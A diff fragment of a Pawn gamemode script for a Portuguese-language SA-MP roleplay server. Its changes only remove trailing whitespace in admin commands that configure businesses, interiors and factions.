 		hInfo[i][GaragemPickupID] = 2485;
 		hInfo[i][GaragemLocked] = 0;
-		
+
   		format(hInfo[i][Nome], 32, "%s", "Unused");
     	format(hInfo[i][Owner], 32, "%s", "Ninguém");
 
@@ -25550,7 +25531,7 @@ COMMAND:abizcmds(playerid, params[], help)
     SendClientMessage(playerid, COLOR_CHAT, "[Comandos de BUSINESSES:] {FFFFFF}/resetbizzes - /abizprice - /abiztype - /abizentrance");
     SendClientMessage(playerid, COLOR_CHAT, "[Comandos de BUSINESSES:] {FFFFFF}/abizproducts - /abizint - /abizlock - /abizsell - /abizconfig - /abizlockall");
     SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
-    
+
     return 1;
 }
 
@@ -25561,7 +25542,7 @@ COMMAND:abizlockall(playerid, params[], help)
 	for(new i = 0; i < MAX_BUSINESS; i++)
 	{
 	    if(i == 0) continue;
-	    
+
 	    bInfo[i][Locked] = 1;
 	}
 
@@ -25590,9 +25571,9 @@ COMMAND:abizconfig(playerid, params[], help)
     {
         bInfo[id][Price] = 165000;
         bInfo[id][Type] = BTYPE_RESTAURANTE;
-        
+
         new rand = random(6);
-        
+
         switch(rand)
         {
 			case 0:
@@ -25685,7 +25666,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 155000;
         bInfo[id][Type] = BTYPE_BAR;
-        
+
         new rand = random(3);
 
         switch(rand)
@@ -25738,7 +25719,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 180000;
         bInfo[id][Type] = BTYPE_247;
-        
+
         new rand = random(4);
 
         switch(rand)
@@ -25805,7 +25786,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 230000;
         bInfo[id][Type] = BTYPE_GASOLINA;
-        
+
         new rand = random(4);
 
         switch(rand)
@@ -25872,7 +25853,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 130000;
         bInfo[id][Type] = BTYPE_TELE;
-        
+
 		bInfo[id][ExitX] = -2240.569824;
 		bInfo[id][ExitY] = 128.020996;
 		bInfo[id][ExitZ] = 1035.419922;
@@ -25889,7 +25870,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 1000000;
         bInfo[id][Type] = BTYPE_STAND;
-        
+
 		bInfo[id][ExitX] = 2828.0786;
 		bInfo[id][ExitY] = -1679.4679;
 		bInfo[id][ExitZ] = 663.8648;
@@ -25901,7 +25882,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 230000;
         bInfo[id][Type] = BTYPE_CACA;
-        
+
         new rand = random(2);
 
         switch(rand)
@@ -25940,7 +25921,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 160000;
         bInfo[id][Type] = BTYPE_ROUPA;
-        
+
         new rand = random(6);
 
         switch(rand)
@@ -26035,7 +26016,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 170000;
         bInfo[id][Type] = BTYPE_FARMACIA;
-        
+
 		bInfo[id][ExitX] = -2240.569824;
 		bInfo[id][ExitY] = 128.020996;
 		bInfo[id][ExitZ] = 1035.419922;
@@ -26052,7 +26033,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 185000;
         bInfo[id][Type] = BTYPE_APOSTAS;
-        
+
 		bInfo[id][ExitX] = 833.818970;
 		bInfo[id][ExitY] = 7.418000;
 		bInfo[id][ExitZ] = 1004.179993;
@@ -26069,7 +26050,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 300000;
         bInfo[id][Type] = BTYPE_SEGURADORA;
-        
+
 		bInfo[id][ExitX] = 2828.0786;
 		bInfo[id][ExitY] = -1679.4679;
 		bInfo[id][ExitZ] = 663.8648;
@@ -26081,7 +26062,7 @@ COMMAND:abizconfig(playerid, params[], help)
 	{
         bInfo[id][Price] = 500000;
         bInfo[id][Type] = BTYPE_CENTROCOMERCIAL;
-        
+
 		bInfo[id][ExitX] = 270.3064;
 		bInfo[id][ExitY] = 147.1894;
 		bInfo[id][ExitZ] = 1033.3920;
@@ -26120,7 +26101,7 @@ COMMAND:abizsell(playerid, params[], help)
 	bInfo[id][Entrada] = 0;
 	format(bInfo[id][Nome], 32, "%s", "Unused");
 	format(bInfo[id][Owner], 32, "%s", "Ninguém");
-	
+
 	GuardarBizz(id);
 	AtualizarBiz(id);
 
@@ -26147,28 +26128,28 @@ COMMAND:abizint(playerid, params[], help)
 		SendClientMessage(playerid, COLOR_CHAT, "[INTS:] {FFFFFF}27: Jizzys (Drink) - 27-33: 24-7's (Buy) - 34: Papelaria - 35: Centro Comercial - 36: Office");
 		return 1;
 	}
-	
+
     if(id <= 0 || id > (MAX_BUSINESS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}ID inválido");
     if(interior < 0 || interior > 36) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Interior inválido");
-    
+
     new string[64];
-    
+
     switch(interior)
     {
-        case 1: 
+        case 1:
         {
 			bInfo[id][ExitX] = 411.625976;
 			bInfo[id][ExitY] = -21.433298;
 			bInfo[id][ExitZ] = 1001.804687;
-			
+
 			bInfo[id][Interior] = 2;
-			
+
 			bInfo[id][ActorX] = 414.0713;
 			bInfo[id][ActorY] = -14.8485;
 			bInfo[id][ActorZ] = 1001.8047;
 			bInfo[id][ActorAngle] = 185.7458;
 			bInfo[id][ActorModel] = 156;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Barbearia.", id);
 			SendClientMessage(playerid, COLOR_INFO , string);
         }
@@ -26177,49 +26158,49 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 1212.019897;
 			bInfo[id][ExitY] = -28.663099;
 			bInfo[id][ExitZ] = 1001.089966;
-			
+
 			bInfo[id][Interior] = 2;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
 			bInfo[id][ActorAngle] = 0;
 			bInfo[id][ActorModel] = 0;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Big Spread Ranch Strip Club.", id);
 			SendClientMessage(playerid, COLOR_INFO, string);
         }
-        case 3: 
+        case 3:
         {
 			bInfo[id][ExitX] = 363.1974;
 			bInfo[id][ExitY] = -74.8233;
 			bInfo[id][ExitZ] = 1001.5078;
-			
+
 			bInfo[id][Interior] = 10;
-			
+
 			bInfo[id][ActorX] = 376.4986;
 			bInfo[id][ActorY] = -65.8491;
 			bInfo[id][ActorZ] = 1001.5078;
 			bInfo[id][ActorAngle] = 179.6272;
 			bInfo[id][ActorModel] = 205;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Burger Shot.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
-        case 4: 
+        case 4:
         {
 			bInfo[id][ExitX] = 365.672974;
 			bInfo[id][ExitY] = -10.713200;
 			bInfo[id][ExitZ] = 1001.869995;
-			
+
 			bInfo[id][Interior] = 9;
-			
+
 			bInfo[id][ActorX] = 368.1107;
 			bInfo[id][ActorY] = -4.4927;
 			bInfo[id][ActorZ] = 1001.8516;
 			bInfo[id][ActorAngle] = 177.1600;
 			bInfo[id][ActorModel] = 167;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Cluckin Bell.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26228,9 +26209,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 372.351990;
 			bInfo[id][ExitY] = -131.650986;
 			bInfo[id][ExitZ] = 1001.449951;
-			
+
 			bInfo[id][Interior] = 5;
-			
+
 			bInfo[id][ActorX] = 374.7303;
 			bInfo[id][ActorY] = -117.2787;
 			bInfo[id][ActorZ] = 1001.4922;
@@ -26245,7 +26226,7 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 377.098999;
 			bInfo[id][ExitY] = -192.439987;
 			bInfo[id][ExitZ] = 1000.643982;
-			
+
 			bInfo[id][Interior] = 17;
 
 			bInfo[id][ActorX] = 380.7200;
@@ -26253,7 +26234,7 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ActorZ] = 1000.6328;
 			bInfo[id][ActorAngle] = 180.1055;
 			bInfo[id][ActorModel] = 194;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Rusty Brown Dohnuts.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26262,7 +26243,7 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 460.099976;
 			bInfo[id][ExitY] = -88.428497;
 			bInfo[id][ExitZ] = 999.621948;
-			
+
 			bInfo[id][Interior] = 4;
 
 			bInfo[id][ActorX] = 449.3911;
@@ -26270,7 +26251,7 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ActorZ] = 999.5547;
 			bInfo[id][ActorAngle] = 180.7716;
 			bInfo[id][ActorModel] = 194;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Jays Diner.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26279,9 +26260,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 681.474976;
 			bInfo[id][ExitY] = -451.150970;
 			bInfo[id][ExitZ] = -25.616798;
-			
+
 			bInfo[id][Interior] = 1;
-			
+
 			bInfo[id][ActorX] = 681.4504;
 			bInfo[id][ActorY] = -455.4607;
 			bInfo[id][ActorZ] = -25.6099;
@@ -26296,15 +26277,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 493.3351;
 			bInfo[id][ExitY] = -24.6042;
 			bInfo[id][ExitZ] = 1000.6797;
-			
+
 			bInfo[id][Interior] = 17;
-			
+
 			bInfo[id][ActorX] = 501.8495;
 			bInfo[id][ActorY] = -21.4766;
 			bInfo[id][ActorZ] = 1000.6797;
 			bInfo[id][ActorAngle] = 87.3976;
 			bInfo[id][ActorModel] = 194;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Alhambra.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26313,32 +26294,32 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 501.980988;
 			bInfo[id][ExitY] = -69.150200;
 			bInfo[id][ExitZ] = 998.834961;
-			
+
 			bInfo[id][Interior] = 11;
-			
+
 			bInfo[id][ActorX] = 499.7752;
 			bInfo[id][ActorY] = -77.5624;
 			bInfo[id][ActorZ] = 998.7651;
 			bInfo[id][ActorAngle] = 2.6041;
 			bInfo[id][ActorModel] = 194;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Mistys.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
-        case 11: 
+        case 11:
         {
 			bInfo[id][ExitX] = -228.9999;
 			bInfo[id][ExitY] = 1401.5785;
 			bInfo[id][ExitZ] = 27.769798;
-			
+
 			bInfo[id][Interior] = 18;
-			
+
 			bInfo[id][ActorX] = -223.3081;
 			bInfo[id][ActorY] = 1406.1765;
 			bInfo[id][ActorZ] = 27.7734;
 			bInfo[id][ActorAngle] = 82.4471;
 			bInfo[id][ActorModel] = 194;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Lil' Probe Inn.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26347,9 +26328,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 204.3197;
 			bInfo[id][ExitY] = -168.4327;
 			bInfo[id][ExitZ] = 1000.578979;
-			
+
 			bInfo[id][Interior] = 14;
-			
+
 			bInfo[id][ActorX] = 204.4223;
 			bInfo[id][ActorY] = -157.8301;
 			bInfo[id][ActorZ] = 1000.5234;
@@ -26364,9 +26345,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 207.6663;
 			bInfo[id][ExitY] = -110.5711;
 			bInfo[id][ExitZ] = 1005.269958;
-			
+
 			bInfo[id][Interior] = 15;
-			
+
 			bInfo[id][ActorX] = 208.8333;
 			bInfo[id][ActorY] = -98.7053;
 			bInfo[id][ActorZ] = 1005.2578;
@@ -26381,15 +26362,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 207.054993;
 			bInfo[id][ExitY] = -138.804993;
 			bInfo[id][ExitZ] = 1003.519958;
-			
+
 			bInfo[id][Interior] = 3;
-			
+
 			bInfo[id][ActorX] = 207.0232;
 			bInfo[id][ActorY] = -127.8072;
 			bInfo[id][ActorZ] = 1003.5078;
 			bInfo[id][ActorAngle] = 179.7063;
 			bInfo[id][ActorModel] = 211;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: ProLaps.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26398,15 +26379,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 203.8892;
 			bInfo[id][ExitY] = -50.1709;
 			bInfo[id][ExitZ] = 1001.799988;
-			
+
 			bInfo[id][Interior] = 1;
-			
+
 			bInfo[id][ActorX] = 203.2186;
 			bInfo[id][ActorY] = -41.6711;
 			bInfo[id][ActorZ] = 1001.8047;
 			bInfo[id][ActorAngle] = 178.0142;
 			bInfo[id][ActorModel] = 211;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: SubUrban.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26415,15 +26396,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 226.293991;
 			bInfo[id][ExitY] = -7.431530;
 			bInfo[id][ExitZ] = 1002.259949;
-			
+
 			bInfo[id][Interior] = 5;
-			
+
 			bInfo[id][ActorX] = 204.8535;
 			bInfo[id][ActorY] = -7.2751;
 			bInfo[id][ActorZ] = 1001.2109;
 			bInfo[id][ActorAngle] = 265.3326;
 			bInfo[id][ActorModel] = 211;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Victim.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26432,15 +26413,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 161.3083;
 			bInfo[id][ExitY] = -96.3637;
 			bInfo[id][ExitZ] = 1001.804687;
-			
+
 			bInfo[id][Interior] = 18;
-			
+
 			bInfo[id][ActorX] = 162.7960;
 			bInfo[id][ActorY] = -81.1917;
 			bInfo[id][ActorZ] = 1001.8047;
 			bInfo[id][ActorAngle] = 180.2932;
 			bInfo[id][ActorModel] = 211;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Zip.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26449,15 +26430,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 1133.2266;
 			bInfo[id][ExitY] = -15.573059;
 			bInfo[id][ExitZ] = 1000.750000;
-			
+
 			bInfo[id][Interior] = 12;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
 			bInfo[id][ActorAngle] = 0;
 			bInfo[id][ActorModel] = 0;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Small Casino in Redsands West.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26466,9 +26447,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 833.818970;
 			bInfo[id][ExitY] = 7.418000;
 			bInfo[id][ExitZ] = 1004.179993;
-			
+
 			bInfo[id][Interior] = 3;
-			
+
 			bInfo[id][ActorX] = 820.1870;
 			bInfo[id][ActorY] = 2.3883;
 			bInfo[id][ActorZ] = 1004.1797;
@@ -26483,19 +26464,19 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = -100.325996;
 			bInfo[id][ExitY] = -25.816500;
 			bInfo[id][ExitZ] = 1000.741943;
-			
+
 			bInfo[id][Interior] = 3;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
 			bInfo[id][ActorAngle] = 0;
             bInfo[id][ActorModel] = 0;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Sex Shop.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
-        case 21: 
+        case 21:
         {
 			bInfo[id][ExitX] = -2240.569824;
 			bInfo[id][ExitY] = 128.020996;
@@ -26508,18 +26489,18 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ActorZ] = 1035.4141;
 			bInfo[id][ActorAngle] = 0.9806;
 			bInfo[id][ActorModel] = 289;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Zero's RC Shop.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
-        case 22: 
+        case 22:
         {
 			bInfo[id][ExitX] = 286.148987;
 			bInfo[id][ExitY] = -40.644398;
 			bInfo[id][ExitZ] = 1001.569946;
-			
+
 			bInfo[id][Interior] = 1;
-			
+
 			bInfo[id][ActorX] = 295.1808;
 			bInfo[id][ActorY] = -40.2152;
 			bInfo[id][ActorZ] = 1001.5156;
@@ -26534,15 +26515,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 285.800995;
 			bInfo[id][ExitY] = -86.547600;
 			bInfo[id][ExitZ] = 1001.539978;
-			
+
 			bInfo[id][Interior] = 4;
-			
+
 			bInfo[id][ActorX] = 295.5957;
 			bInfo[id][ActorY] = -82.5282;
 			bInfo[id][ActorZ] = 1001.5156;
 			bInfo[id][ActorAngle] = 355.4659;
 			bInfo[id][ActorModel] = 179;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Ammunation 2.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26551,9 +26532,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 296.919983;
 			bInfo[id][ExitY] = -111.071999;
 			bInfo[id][ExitZ] = 1001.569946;
-			
+
 			bInfo[id][Interior] = 6;
-			
+
 			bInfo[id][ActorX] = 291.4510;
 			bInfo[id][ActorY] = -104.4912;
 			bInfo[id][ActorZ] = 1001.5156;
@@ -26568,15 +26549,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 316.524994;
 			bInfo[id][ExitY] = -167.706985;
 			bInfo[id][ExitZ] = 999.661987;
-			
+
 			bInfo[id][Interior] = 7;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
 			bInfo[id][ActorAngle] = 0;
 			bInfo[id][ActorModel] = 0;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Ammunation 4.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26585,15 +26566,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 302.292877;
 			bInfo[id][ExitY] = -143.139099;
 			bInfo[id][ExitZ] = 1004.062500;
-			
+
             bInfo[id][Interior] = 17;
-            
+
    			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
 			bInfo[id][ActorAngle] = 0;
 			bInfo[id][ActorModel] = 0;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Ammunation Shooting Range.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26602,15 +26583,15 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = -2637.449951;
 			bInfo[id][ExitY] = 1404.629883;
 			bInfo[id][ExitZ] = 906.457947;
-			
+
 			bInfo[id][Interior] = 10;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
 			bInfo[id][ActorAngle] = 0;
 			bInfo[id][ActorModel] = 0;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: Jizzys.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26619,26 +26600,26 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = -25.884499;
 			bInfo[id][ExitY] = -185.868988;
 			bInfo[id][ExitZ] = 1003.549988;
-			
+
 			bInfo[id][Interior] = 18;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
 			bInfo[id][ActorAngle] = 0;
 			bInfo[id][ActorModel] = 0;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: 24-7 1.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
-        case 29: 
+        case 29:
         {
 			bInfo[id][ExitX] = 6.091180;
 			bInfo[id][ExitY] = -31.271898;
 			bInfo[id][ExitZ] = 1003.549988;
-			
+
 			bInfo[id][Interior] = 10;
-			
+
 			bInfo[id][ActorX] = 3.3154;
 			bInfo[id][ActorY] = -30.7009;
 			bInfo[id][ActorZ] = 1003.5494;
@@ -26648,37 +26629,37 @@ COMMAND:abizint(playerid, params[], help)
 			format(string, sizeof string, "Loja: %d - Descrição: 24-7 2.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
-        case 30: 
+        case 30:
         {
 			bInfo[id][ExitX] = -30.946699;
 			bInfo[id][ExitY] = -91.609596;
 			bInfo[id][ExitZ] = 1003.549988;
-			
+
 			bInfo[id][Interior] = 18;
-			
+
 			bInfo[id][ActorX] = -26.9505;
 			bInfo[id][ActorY] = -91.6199;
 			bInfo[id][ActorZ] = 1003.5469;
 			bInfo[id][ActorAngle] = 3.7378;
 			bInfo[id][ActorModel] = 194;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: 24-7 3.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
-        case 31: 
+        case 31:
         {
 			bInfo[id][ExitX] = -25.132599;
 			bInfo[id][ExitY] = -141.066986;
 			bInfo[id][ExitZ] = 1003.549988;
-			
+
 			bInfo[id][Interior] = 16;
-			
+
 			bInfo[id][ActorX] = -20.8918;
 			bInfo[id][ActorY] = -140.3370;
 			bInfo[id][ActorZ] = 1003.5469;
 			bInfo[id][ActorAngle] = 359.5393;
 			bInfo[id][ActorModel] = 194;
-			
+
 			format(string, sizeof string, "Loja: %d - Descrição: 24-7 4.", id);
 			SendClientMessage(playerid, COLOR_INFO,string);
         }
@@ -26687,7 +26668,7 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = -27.312300;
 			bInfo[id][ExitY] = -29.277599;
 			bInfo[id][ExitZ] = 1003.549988;
-			
+
 			bInfo[id][Interior] = 4;
 
 			bInfo[id][ActorX] = 0;
@@ -26704,9 +26685,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = -26.691599;
 			bInfo[id][ExitY] = -55.714897;
 			bInfo[id][ExitZ] = 1003.549988;
-			
+
 			bInfo[id][Interior] = 6;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
@@ -26721,9 +26702,9 @@ COMMAND:abizint(playerid, params[], help)
 			bInfo[id][ExitX] = 833.269775;
 			bInfo[id][ExitY] = 10.588416;
 			bInfo[id][ExitZ] = 1004.179687;
-			
+
 			bInfo[id][Interior] = 6;
-			
+
 			bInfo[id][ActorX] = 0;
 			bInfo[id][ActorY] = 0;
 			bInfo[id][ActorZ] = 0;
@@ -26851,7 +26832,7 @@ COMMAND:abizentrance(playerid, params[], help)
 
 	new string[128];
 	new Float:x, Float:y, Float:z, VW, Int, Float:a;
-	
+
 	GetPlayerPos(playerid, x, y, z);
 	GetPlayerFacingAngle(playerid, a);
 	VW = GetPlayerVirtualWorld(playerid);
@@ -26884,7 +26865,7 @@ COMMAND:abiztype(playerid, params[], help)
 	    SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}1: Restaurante - 2: Bar - 3: 24/7 - 4: Gasolina - 5: Telecomunicações - 6: Stand");
 	    SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}7: Loja de Caça - 8: Loja de Roupa - 9: Farmácia - 10: Loja de Apostas - 11: Seguradora");
 	    SendClientMessage(playerid, COLOR_CHAT, "[Types]: {FFFFFF}12: Centro Comercial");
-	
+
 	    return 1;
 	}
 
@@ -26917,7 +26898,7 @@ COMMAND:abizprice(playerid, params[], help)
 	bInfo[id][Price] = price;
 	GuardarBizz(id);
 	AtualizarBiz(id);
-	
+
     format(string, sizeof(string), "Setaste a loja %d para custar %d$", id, price);
     SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -26929,11 +26910,11 @@ COMMAND:resetbizzes(playerid, params[], help)
     if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
 
 	new i, Float:distance = 6.0, Float:metres = distance, Float:a;
-	
+
 	for(; i < sizeof(bInfo); i++, metres += distance)
 	{
 	    if(i == 0) continue;
-	    
+
 		GetPlayerPos(playerid, bInfo[i][EnterX], bInfo[i][EnterY], bInfo[i][EnterZ]);
 		GetPlayerFacingAngle(playerid, a);
 
@@ -26952,10 +26933,10 @@ COMMAND:resetbizzes(playerid, params[], help)
 		bInfo[i][Entrada] = 0;
   		format(bInfo[i][Nome], 32, "%s", "Unused");
     	format(bInfo[i][Owner], 32, "%s", "Ninguém");
-    	
+
     	AtualizarBiz(i);
 	}
-	
+
 	GuardarBizzes();
     SendClientMessage(playerid, COLOR_INFO, "Deste reset a todas as lojas do servidor");
 
@@ -26985,7 +26966,7 @@ COMMAND:afactionlist(playerid, params[], help)
 	for(new i = 0; i < MAX_FACTIONS; i++)
 	{
 		if(i == 0) continue;
-		
+
 		format(string, sizeof(string), "[FACTION (%d)]: {FFFFFF}%s", i, fInfo[i][Nome]);
 		SendClientMessage(playerid, COLOR_ORANGE, string);
 	}
@@ -27001,9 +26982,9 @@ COMMAND:afactioninfo(playerid, params[], help)
 
     if(sscanf(params, "d", faction)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactioninfo <id>");
     if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
-    
+
     new legal[4], useduty[4];
-    
+
     if(fInfo[faction][Legal] == 1)
     {
         legal = "Sim";
@@ -27012,7 +26993,7 @@ COMMAND:afactioninfo(playerid, params[], help)
     {
         legal = "Não";
     }
-    
+
     if(fInfo[faction][UseDuty] == 1)
     {
         useduty = "Sim";
@@ -27021,7 +27002,7 @@ COMMAND:afactioninfo(playerid, params[], help)
     {
         useduty = "Não";
     }
-    
+
 	format(string, sizeof(string), "Faction: %s - Cor: %s - Faction Type: %d - Join Rank: %s - Banco: %d$ - Legal: %s - UseDuty: %s", fInfo[faction][Nome], fInfo[faction][Color], fInfo[faction][Type], GetRankName(faction, fInfo[faction][JoinRank]), fInfo[faction][Bank], legal, useduty);
 	SendClientMessage(playerid, COLOR_ORANGE, string);
     format(string, sizeof(string), "Rank 1: %s - Rank 2: %s - Rank 3: %s - Rank 4: %s - Rank 5: %s - Rank 6: %s", GetRankName(faction, 1), GetRankName(faction, 2), GetRankName(faction, 3), GetRankName(faction, 4), GetRankName(faction, 5), GetRankName(faction, 6));
@@ -27030,7 +27011,7 @@ COMMAND:afactioninfo(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_ORANGE, string);
     format(string, sizeof(string), "Salário 1: %d$ - Salário 2: %d$ - Salário 3: %d$ - Salário 4: %d$ - Salário 5: %d$ - Salário 6: %d$", fInfo[faction][SalarioRank1], fInfo[faction][SalarioRank2], fInfo[faction][SalarioRank3], fInfo[faction][SalarioRank4], fInfo[faction][SalarioRank5], fInfo[faction][SalarioRank6]);
 	SendClientMessage(playerid, COLOR_ORANGE, string);
-	
+
     return 1;
 }
 
@@ -27095,7 +27076,7 @@ COMMAND:afactiondutypos(playerid, params[], help)
 	GetPlayerPos(playerid, x, y, z);
 	VW = GetPlayerVirtualWorld(playerid);
 	Int = GetPlayerInterior(playerid);
-	
+
 	fInfo[faction][DutyX] = x;
 	fInfo[faction][DutyY] = y;
 	fInfo[faction][DutyZ] = z;
@@ -27103,7 +27084,7 @@ COMMAND:afactiondutypos(playerid, params[], help)
 	fInfo[faction][DutyInterior] = Int;
 
 	GuardarFaction(faction);
-	
+
 	format(string, sizeof(string), "Alteraste a posição do duty da faction %s para atua posição", fInfo[faction][Nome]);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -27118,7 +27099,7 @@ COMMAND:afactionuseduty(playerid, params[], help)
 
     if(sscanf(params, "d", faction)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactionuseduty <id>");
     if(faction <= 0 || faction > (MAX_FACTIONS -1)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction inválida");
-    
+
     if(fInfo[faction][UseDuty] == 0)
     {
         format(string, sizeof(string), "Ativaste o duty na faction %s", fInfo[faction][Nome]);
@@ -27152,7 +27133,7 @@ COMMAND:afactionkick(playerid, params[], help)
 	pInfo[giveplayerid][FactionRank] = 0;
 
     SendClientMessage(playerid, COLOR_INFO, string);
-    
+
     format(string, sizeof(string), "Foste expulso da tua faction pelo Administrador %s", GetPlayerNameEx(playerid));
     SendClientMessage(giveplayerid, COLOR_INFO, string);
 
@@ -27298,10 +27279,10 @@ COMMAND:afactiontype(playerid, params[], help)
     if(sscanf(params, "dd", faction, type))
 	{
         SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/afactiontype <faction> <type>");
-        
+
